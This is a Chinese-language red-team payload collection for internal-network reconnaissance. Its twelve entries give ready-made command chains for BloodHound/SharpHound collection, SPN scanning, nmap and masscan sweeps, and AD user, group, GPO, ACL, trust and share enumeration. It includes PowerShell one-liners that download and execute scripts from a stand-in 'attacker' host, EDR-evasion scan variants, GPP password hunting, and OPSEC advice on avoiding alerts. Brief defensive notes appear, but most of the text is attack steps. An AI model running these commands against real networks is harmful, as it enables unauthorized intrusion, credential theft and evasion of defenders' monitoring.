# 信息收集

_12 条 intranet payload_

### BloodHound域分析  `bloodhound-enumeration`
_使用BloodHound分析Active Directory攻击路径_
子类：**域分析** · tags: `bloodhound` `active-directory` `enumeration` `neo4j`

**前置条件：**
- 域环境
- 域用户凭证
- BloodHound工具

**攻击链：**

**SharpHound采集**
> 使用SharpHound采集域信息
_platform: windows_
```
SharpHound.exe -c All
```
**语法解析：**
- `SharpHound.exe` — BloodHound数据采集工具 _command_
- `-c All` — 采集所有类型的数据 _parameter_

**PowerShell采集**
> 通过PowerShell远程加载采集
_platform: windows_
```
IEX(New-Object Net.WebClient).DownloadString("http://attacker/SharpHound.ps1"); Invoke-BloodHound -CollectionMethod All
```
**语法解析：**
- `Invoke-BloodHound` — PowerShell版本的采集命令 _command_
- `-CollectionMethod` — 指定采集方法 _parameter_

**bloodhound-python**
> 使用Python版本采集
_platform: linux_
```
bloodhound-python -u user -p password -d target.com -ns dc_ip
```
**语法解析：**
- `bloodhound-python` — Python版BloodHound采集器 _command_
- `-u` — 用户名 _parameter_
- `-d` — 域名 _parameter_
- `-ns` — 域名服务器 _parameter_

**指定域控制器**
> 指定域控制器采集
_platform: windows_
```
SharpHound.exe -c All --LdapUsername user --LdapPassword pass --DomainController dc.target.com
```
**语法解析：**
- `--LdapUsername` — LDAP认证用户名 _parameter_
- `--DomainController` — 指定域控制器 _parameter_

**启动Neo4j**
> 启动Neo4j数据库
_platform: linux_
```
sudo neo4j console
```

**Cypher查询域管**
> 查询域管理员用户
```
MATCH (n:User) WHERE n.admincount=true RETURN n
```

**查询攻击路径**
> 查询到域管理员的最短路径
```
MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@DOMAIN.COM" RETURN p
```

**EDR 绕过变体：**

**隐蔽采集**
> 随机化文件名避免检测
```
SharpHound.exe -c All --LdapUsername user --LdapPassword pass --OutputDirectory C:\Users\Public --RandomizeFilenames
```


**分析：** BloodHound可发现域内的攻击路径，如权限提升路径、会话信息、组关系等。

**OPSEC 提示：**
- BloodHound采集会产生大量LDAP查询
- 可能触发域控制器告警
- 建议在非工作时间执行

**概述：** BloodHound是一款用于分析Active Directory信任关系的工具，可以可视化攻击路径，帮助发现权限提升机会。

**漏洞原理：** Active Directory的复杂信任关系可能导致意外的权限提升路径，BloodHound可以发现这些路径。

**利用方法：** 利用流程：1) 采集域信息；2) 导入BloodHound；3) 分析攻击路径；4) 发现权限提升机会；5) 执行攻击。

**防御措施：** 防御措施：1) 定期审计AD权限；2) 最小权限原则；3) 监控异常LDAP查询；4) 清理不必要的信任关系。

---

### SPN扫描  `spn-scan`
_扫描域内服务主体名称_
子类：**SPN** · tags: `spn` `kerberos` `enumeration`

**前置条件：**
- 域环境
- 任意域用户凭证

**攻击链：**

**查询所有SPN**
> 查询域内所有SPN
_platform: windows_
```
setspn -T domain.com -Q */*
```
**语法解析：**
- `setspn` — Service Principal Name工具 _command_
- `-T` — 指定域 _parameter_
- `-Q` — 查询模式 _parameter_

**PowerShell查询**
> PowerShell查询SPN用户
_platform: windows_
```
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
```
**语法解析：**
- `Get-ADUser` — 获取AD用户命令 _command_
- `-Filter` — 过滤条件 _parameter_
- `-Properties` — 返回的属性 _parameter_

**Impacket查询**
> Impacket查询SPN
_platform: linux_
```
GetUserSPNs.py domain/user:password -dc-ip dc_ip
```
**语法解析：**
- `GetUserSPNs.py` — Impacket SPN查询工具 _command_
- `-dc-ip` — 域控制器IP _parameter_

**查询特定服务**
> 查询HTTP服务的SPN
_platform: windows_
```
setspn -T domain.com -Q HTTP/*
```

**查找SQL服务**
> 查询MSSQL服务的SPN
_platform: windows_
```
setspn -T domain.com -Q MSSQLSvc/*
```


**分析：** SPN扫描可以发现域内运行的服务账户，为Kerberoasting攻击做准备。

**OPSEC 提示：**
- SPN查询是正常的域操作
- 不会触发明显告警
- 可用于后续Kerberoasting攻击

**概述：** SPN扫描可以发现域内运行的服务账户，为Kerberoasting攻击做准备。

**漏洞原理：** SPN是Kerberos认证的一部分，攻击者可以通过SPN找到高价值的服务账户。

**利用方法：** 利用流程：1) 扫描SPN；2) 识别高价值账户；3) 请求Kerberos票据；4) 离线破解。

**防御措施：** 防御措施：1) 服务账户使用强密码；2) 监控异常的SPN查询；3) 定期审计SPN账户。

---

### 内网端口扫描  `port-scan`
_内网端口扫描与服务识别_
子类：**端口扫描** · tags: `nmap` `port-scan` `enumeration`

**前置条件：**
- 内网访问权限
- 扫描工具

**攻击链：**

**快速扫描**
> 快速扫描常用端口
_platform: linux_
```
nmap -sS -T4 -F 192.168.1.0/24
```
**语法解析：**
- `-sS` — SYN扫描，半开放扫描 _parameter_
- `-T4` — 扫描速度模板(0-5) _parameter_
- `-F` — 快速模式，只扫常用端口 _parameter_

**全端口扫描**
> 扫描所有65535端口
_platform: linux_
```
nmap -sS -p- 192.168.1.1
```
**语法解析：**
- `-p-` — 扫描所有端口(1-65535) _parameter_

**服务识别**
> 服务版本探测和脚本扫描
_platform: linux_
```
nmap -sV -sC 192.168.1.1
```
**语法解析：**
- `-sV` — 服务版本探测 _parameter_
- `-sC` — 使用默认脚本扫描 _parameter_

**内网存活探测**
> Ping扫描发现存活主机
_platform: linux_
```
nmap -sn 192.168.1.0/24
```
**语法解析：**
- `-sn` — Ping扫描，不进行端口扫描 _parameter_

**Masscan快速扫描**
> 高速端口扫描
_platform: linux_
```
masscan -p1-65535 192.168.1.0/24 --rate=1000
```
**语法解析：**
- `masscan` — 高速端口扫描工具 _command_
- `--rate` — 扫描速率(包/秒) _parameter_

**操作系统识别**
> 识别目标操作系统
_platform: linux_
```
nmap -O 192.168.1.1
```
**语法解析：**
- `-O` — 操作系统探测 _parameter_

**UDP扫描**
> 扫描常用UDP端口
_platform: linux_
```
nmap -sU --top-ports 20 192.168.1.1
```
**语法解析：**
- `-sU` — UDP扫描 _parameter_
- `--top-ports` — 扫描最常用的N个端口 _parameter_

**漏洞扫描**
> 使用漏洞扫描脚本
_platform: linux_
```
nmap --script vuln 192.168.1.1
```
**语法解析：**
- `--script vuln` — 使用漏洞类别脚本 _parameter_

**EDR 绕过变体：**

**隐蔽扫描**
> 低速分片扫描，添加随机数据
```
nmap -sS -T2 -f --data-length 50 192.168.1.1
```

**诱饵扫描**
> 使用诱饵IP混淆扫描来源
```
nmap -sS -D RND:10 192.168.1.1
```


**分析：** 端口扫描可以发现内网中开放的服务，识别潜在的攻击目标。

**OPSEC 提示：**
- 高速扫描可能触发IDS告警
- 建议使用较低速率
- 分时段进行扫描

**概述：** 端口扫描是内网渗透的第一步，用于发现开放的服务和潜在的攻击面。

**漏洞原理：** 内网中可能存在未打补丁的服务或配置不当的服务。

**利用方法：** 利用流程：1) 发现存活主机；2) 扫描开放端口；3) 识别服务版本；4) 寻找漏洞利用。

**防御措施：** 防御措施：1) 关闭不必要的服务；2) 配置防火墙规则；3) 监控异常扫描行为。

---

### 域信息收集  `domain-recon`
_Active Directory域环境信息收集_
子类：**域信息** · tags: `active-directory` `domain` `enumeration`

**前置条件：**
- 域环境
- 任意域用户凭证

**攻击链：**

**域信息**
> 获取域信息
_platform: windows_
```
net config workstation
```
**语法解析：**
- `net config` — 显示配置信息 _command_
- `workstation` — 工作站配置 _value_

**域控制器**
> 列出域控制器
_platform: windows_
```
nltest /dclist:domain.com
```
**语法解析：**
- `nltest` — Windows域工具 _command_
- `/dclist` — 列出域控制器 _parameter_

**域用户**
> 列出域用户
_platform: windows_
```
net user /domain
```
**语法解析：**
- `net user` — 用户管理命令 _command_
- `/domain` — 指定域环境 _parameter_

**域管理员**
> 列出域管理员组
_platform: windows_
```
net group "Domain Admins" /domain
```

**域信任关系**
> 列出域信任关系
_platform: windows_
```
nltest /domain_trusts
```

**PowerView收集**
> 使用PowerView收集域信息
_platform: windows_
```
IEX(New-Object Net.WebClient).DownloadString("http://attacker/PowerView.ps1"); Get-NetDomain
```

**获取域策略**
> 获取域密码策略
_platform: windows_
```
Get-DomainPolicy
```

**获取域控制器**
> 获取域控制器信息
_platform: windows_
```
Get-NetDomainController
```


**分析：** 域信息收集是内网渗透的基础，可以了解域结构、用户、组等信息。

**OPSEC 提示：**
- 域信息收集是正常操作
- 不会触发明显告警
- 为后续攻击做准备

**概述：** 域信息收集是内网渗透的基础，可以了解域结构、用户、组等信息。

**漏洞原理：** Active Directory默认允许普通用户查询大部分域信息。

**利用方法：** 利用流程：1) 获取域信息；2) 识别高价值目标；3) 规划攻击路径；4) 执行攻击。

**防御措施：** 防御措施：1) 限制LDAP查询权限；2) 监控异常查询；3) 实施最小权限原则。

---

### 网络信息收集  `network-recon`
_内网网络拓扑和配置信息收集_
子类：**网络信息** · tags: `network` `enumeration` `topology`

**前置条件：**
- 内网访问权限

**攻击链：**

**网络配置**
> 查看网络配置
_platform: windows_
```
ipconfig /all
```
**语法解析：**
- `ipconfig` — 网络配置命令 _command_
- `/all` — 显示详细信息 _parameter_

**路由表**
> 查看路由表
_platform: windows_
```
route print
```

**ARP缓存**
> 查看ARP缓存
_platform: windows_
```
arp -a
```

**网络连接**
> 查看网络连接
_platform: windows_
```
netstat -ano
```
**语法解析：**
- `netstat` — 网络统计命令 _command_
- `-a` — 显示所有连接 _parameter_
- `-n` — 以数字形式显示地址 _parameter_
- `-o` — 显示进程ID _parameter_

**DNS缓存**
> 查看DNS缓存
_platform: windows_
```
ipconfig /displaydns
```

**Linux网络配置**
> Linux查看网络配置
_platform: linux_
```
ifconfig -a
```

**Linux路由表**
> Linux查看路由表
_platform: linux_
```
route -n
```

**traceroute**
> 追踪路由
_platform: windows_
```
tracert target_ip
```


**分析：** 网络信息收集可以了解内网拓扑、网段划分、网关等信息。

**OPSEC 提示：**
- 这些是正常的网络管理命令
- 不会触发告警
- 为后续横向移动做准备

**概述：** 网络信息收集可以了解内网拓扑、网段划分、网关等信息。

**漏洞原理：** 内网中可能存在多个网段和信任关系，攻击者可以利用这些进行横向移动。

**利用方法：** 利用流程：1) 收集网络信息；2) 绘制网络拓扑；3) 发现攻击路径；4) 横向移动。

**防御措施：** 防御措施：1) 网络分段隔离；2) 限制跨网段访问；3) 监控异常网络行为。

---

### 共享枚举  `share-enum`
_枚举网络共享资源_
子类：**共享** · tags: `smb` `share` `enumeration`

**前置条件：**
- 内网访问权限

**攻击链：**

**枚举共享**
> 查看本地共享
_platform: windows_
```
net share
```

**查看远程共享**
> 查看远程机器共享
_platform: windows_
```
net view \\target_ip
```

**SMBMap枚举**
> 使用SMBMap枚举共享
_platform: linux_
```
smbmap -H target_ip -u user -p password
```
**语法解析：**
- `smbmap` — SMB共享枚举工具 _command_
- `-H` — 目标主机 _parameter_

**CrackMapExec枚举**
> 使用CME枚举共享
_platform: linux_
```
crackmapexec smb target_ip -u user -p password --shares
```
**语法解析：**
- `crackmapexec smb` — CME SMB模块 _command_
- `--shares` — 枚举共享 _parameter_

**smbclient枚举**
> 使用smbclient枚举
_platform: linux_
```
smbclient -L target_ip -U user%password
```
**语法解析：**
- `smbclient` — SMB客户端工具 _command_
- `-L` — 列出共享 _parameter_

**PowerView枚举**
> 查找有趣的共享文件
_platform: windows_
```
Find-InterestingDomainShareFile
```


**分析：** 共享枚举可以发现敏感文件、配置文件、备份文件等有价值的信息。

**OPSEC 提示：**
- 共享枚举是正常操作
- 可能发现敏感文件
- 注意文件访问日志

**概述：** 共享枚举可以发现网络中的共享资源，可能包含敏感文件。

**漏洞原理：** 企业网络中经常存在配置不当的共享，包含敏感信息。

**利用方法：** 利用流程：1) 枚举共享；2) 访问共享；3) 搜索敏感文件；4) 获取凭证或信息。

**防御措施：** 防御措施：1) 审计共享权限；2) 移除不必要的共享；3) 监控共享访问。

---

### 用户枚举  `user-enum`
_枚举域内用户信息_
子类：**用户** · tags: `user` `enumeration` `active-directory`

**前置条件：**
- 域环境
- 任意域用户凭证

**攻击链：**

**列出域用户**
> 列出所有域用户
_platform: windows_
```
net user /domain
```

**用户详细信息**
> 查看用户详细信息
_platform: windows_
```
net user username /domain
```

**PowerView枚举**
> 使用PowerView枚举用户
_platform: windows_
```
Get-NetUser | select samaccountname,description,admincount
```

**查找管理员**
> 查找域管理员
_platform: windows_
```
Get-NetUser -AdminCount | select samaccountname
```

**查找活跃用户**
> 查找最近登录的用户
_platform: windows_
```
Get-NetUser | Where-Object {$_.lastlogon -gt (Get-Date).AddDays(-30)}
```

**Impacket枚举**
> 使用Impacket枚举域用户
_platform: linux_
```
GetADUsers.py -all domain/user:password -dc-ip dc_ip
```


**分析：** 用户枚举可以发现高价值目标、活跃用户、服务账户等。

**OPSEC 提示：**
- 用户枚举是正常操作
- 为后续攻击选择目标
- 注意识别蜜罐账户

**概述：** 用户枚举可以发现域内所有用户，识别高价值目标。

**漏洞原理：** Active Directory允许普通用户查询用户信息。

**利用方法：** 利用流程：1) 枚举用户；2) 识别高价值目标；3) 针对性攻击；4) 获取凭证。

**防御措施：** 防御措施：1) 限制用户属性查询；2) 部署蜜罐账户；3) 监控异常查询。

---

### 组枚举  `group-enum`
_枚举域内组信息_
子类：**组** · tags: `group` `enumeration` `active-directory`

**前置条件：**
- 域环境
- 任意域用户凭证

**攻击链：**

**列出域组**
> 列出所有域组
_platform: windows_
```
net group /domain
```

**组成员**
> 查看域管理员组成员
_platform: windows_
```
net group "Domain Admins" /domain
```

**PowerView枚举**
> 使用PowerView枚举组
_platform: windows_
```
Get-NetGroup | select samaccountname,admincount
```

**查找高权限组**
> 查找高权限组
_platform: windows_
```
Get-NetGroup -AdminCount | select samaccountname
```

**组成员关系**
> 获取组成员
_platform: windows_
```
Get-NetGroupMember "Domain Admins" | select membername
```

**递归组成员**
> 递归获取组成员（包括嵌套组）
_platform: windows_
```
Get-NetGroupMember "Domain Admins" -Recurse
```


**分析：** 组枚举可以发现高权限组、组成员关系、嵌套组等。

**OPSEC 提示：**
- 组枚举是正常操作
- 重点关注高权限组
- 注意嵌套组关系

**概述：** 组枚举可以发现域内所有组，识别高权限组和成员关系。

**漏洞原理：** Active Directory允许普通用户查询组信息。

**利用方法：** 利用流程：1) 枚举组；2) 识别高权限组；3) 获取组成员；4) 针对性攻击。

**防御措施：** 防御措施：1) 审计组成员关系；2) 最小权限原则；3) 监控异常查询。

---

### GPO枚举  `gpo-enum`
_枚举组策略对象_
子类：**GPO** · tags: `gpo` `group-policy` `enumeration`

**前置条件：**
- 域环境
- 任意域用户凭证

**攻击链：**

**列出GPO**
> 列出所有GPO
_platform: windows_
```
Get-GPO -All
```

**PowerView枚举**
> 使用PowerView枚举GPO
_platform: windows_
```
Get-NetGPO | select displayname,whencreated
```

**GPO权限**
> 查找GPO中的受限组
_platform: windows_
```
Get-NetGPOGroup
```

**GPP密码**
> 查找GPP中的密码
_platform: windows_
```
Get-NetGPPPassword
```

**查找可利用GPO**
> 查找用户受哪些GPO影响
_platform: windows_
```
Find-GPOLocation -UserName user
```


**分析：** GPO枚举可以发现组策略配置、GPP密码、受限组等信息。

**OPSEC 提示：**
- GPP密码是常见的信息泄露点
- GPO可能包含敏感配置
- 注意GPO修改权限

**概述：** GPO枚举可以发现组策略配置，可能包含密码等敏感信息。

**漏洞原理：** GPP(Group Policy Preferences)可能包含加密存储的密码，可被解密。

**利用方法：** 利用流程：1) 枚举GPO；2) 查找GPP密码；3) 解密密码；4) 使用凭证。

**防御措施：** 防御措施：1) 移除GPP中的密码；2) 使用LAPS管理本地管理员密码；3) 监控GPO修改。

---

### ACL枚举  `acl-enum`
_枚举访问控制列表_
子类：**ACL** · tags: `acl` `access-control` `enumeration`

**前置条件：**
- 域环境
- 任意域用户凭证

**攻击链：**

**PowerView ACL枚举**
> 获取用户对象的ACL
_platform: windows_
```
Get-ObjectAcl -SamAccountName user -ResolveGUIDs
```

**查找危险权限**
> 查找有趣的ACL权限
_platform: windows_
```
Find-InterestingDomainAcl -ResolveGUIDs
```

**查找WriteDACL**
> 查找WriteDACL权限
_platform: windows_
```
Get-ObjectAcl -SamAccountName target -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*WriteDACL*"}
```

**查找GenericAll**
> 查找GenericAll权限
_platform: windows_
```
Get-ObjectAcl -SamAccountName target -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*GenericAll*"}
```

**BloodHound ACL分析**
> BloodHound查询ACL关系
```
MATCH (n)-[r:AllExtendedRights]->(m) RETURN n,m
```


**分析：** ACL枚举可以发现权限配置错误，如WriteDACL、GenericAll等危险权限。

**OPSEC 提示：**
- ACL错误配置是常见的提权路径
- 重点关注高价值目标
- BloodHound可可视化ACL关系

**概述：** ACL枚举可以发现Active Directory中的权限配置错误。

**漏洞原理：** AD中可能存在权限配置错误，允许低权限用户修改高权限对象。

**利用方法：** 利用流程：1) 枚举ACL；2) 发现权限配置错误；3) 利用权限；4) 提升权限。

**防御措施：** 防御措施：1) 定期审计ACL；2) 最小权限原则；3) 监控ACL修改。

---

### 信任关系枚举  `trust-enum`
_枚举域信任关系_
子类：**信任关系** · tags: `trust` `enumeration` `active-directory`

**前置条件：**
- 域环境
- 任意域用户凭证

**攻击链：**

**域信任关系**
> 列出域信任关系
_platform: windows_
```
nltest /domain_trusts
```

**PowerView枚举**
> 使用PowerView枚举信任关系
_platform: windows_
```
Get-NetDomainTrust
```

**森林信任**
> 枚举森林信任关系
_platform: windows_
```
Get-NetForestTrust
```

**信任详细信息**
> 查看信任详细信息
_platform: windows_
```
Get-NetDomainTrust | select SourceDomain,TargetDomain,TrustType,TrustDirection
```


**分析：** 信任关系枚举可以发现跨域/跨森林攻击路径。

**OPSEC 提示：**
- 信任关系可能提供跨域攻击路径
- 关注双向信任
- 注意SID历史问题

**概述：** 信任关系枚举可以发现域之间的信任关系，可能提供跨域攻击路径。

**漏洞原理：** 域信任关系可能允许跨域访问，攻击者可以利用信任关系进行横向移动。

**利用方法：** 利用流程：1) 枚举信任关系；2) 识别可利用的信任；3) 跨域攻击；4) 获取目标域权限。

**防御措施：** 防御措施：1) 审计信任关系；2) 最小化信任范围；3) 监控跨域访问。

---

### 计算机枚举  `computer-enum`
_枚举域内计算机_
子类：**计算机** · tags: `computer` `enumeration` `active-directory`

**前置条件：**
- 域环境
- 任意域用户凭证

**攻击链：**

**列出域计算机**
> 列出域计算机
_platform: windows_
```
net group "Domain Computers" /domain
```

**PowerView枚举**
> 使用PowerView枚举计算机
_platform: windows_
```
Get-NetComputer | select name,operatingsystem,ipv4address
```

**查找域控制器**
> 查找域控制器
_platform: windows_
```
Get-NetComputer -DomainController
```

**查找特定系统**
> 查找特定操作系统
_platform: windows_
```
Get-NetComputer -OperatingSystem "*Server 2019*"
```

**查找活跃计算机**
> 查找在线计算机
_platform: windows_
```
Get-NetComputer -Ping
```

**查找管理员会话**
> 查找域管理员登录位置
_platform: windows_
```
Find-DomainUserLocation
```


**分析：** 计算机枚举可以发现域内所有计算机，识别高价值目标。

**OPSEC 提示：**
- 计算机枚举是正常操作
- 重点关注域控制器和服务器
- 查找管理员会话

**概述：** 计算机枚举可以发现域内所有计算机，识别高价值目标。

**漏洞原理：** Active Directory允许普通用户查询计算机信息。

**利用方法：** 利用流程：1) 枚举计算机；2) 识别高价值目标；3) 扫描服务；4) 横向移动。

**防御措施：** 防御措施：1) 限制计算机信息查询；2) 监控异常查询；3) 网络分段。

---
